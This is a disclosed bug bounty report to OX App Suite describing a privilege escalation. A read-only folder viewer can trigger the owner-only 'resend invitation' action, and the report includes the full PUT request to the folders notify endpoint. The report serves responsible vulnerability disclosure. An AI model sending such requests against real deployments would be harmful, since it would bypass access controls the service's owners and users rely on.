@@ -1,0 +1,43 @@
+ReportLink:https://hackerone.com/reports/219192
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/vijay_kumar1110
+ReportedTo:OX App Suite(appsuite)
+BountyAmount:200.0
+Severity:medium
+State:Closed
+DateOfDisclosure:17.08.2017 20:45:54
+
+Summary:
+
+Hi Team,
+
+Description : Viewer(Read only user ) of any entity(Ex: Address book, Folder etc.) doesn't have access to permission section. This user can't make any action in permission/Invite people  section. 
+But Resending invitation HTTP request is vulnerable and it doesn't check whether the user is Owner or not. 
+
+Working Entities : 
+Address books, Calendar folders, task folders drives etc. 
+
+Vulnerable HTTP request : 
+
+PUT /appsuite/api/folders?action=notify&id=[Folder_ID]&session=[Session_token]&tree=1 HTTP/1.1
+Host: sandbox.open-xchange.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Referer: https://sandbox.open-xchange.com/appsuite/
+Content-Type: text/javascript; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 16
+Cookie: [Cookie_Values]
+Connection: close
+
+{"entities":[User_ID]}
+
+If any Read only user send this request to server , it will be accepted and invitation link will be sent to member. 
+
+Issue : Only Owner of the folder is able to make this action but this is possible by View(Read user) of folder. 
+
+Let me know if you require Video POC or any steps to reproduce this issue. 
+
+Best Regards !
+Vijay Kumar 
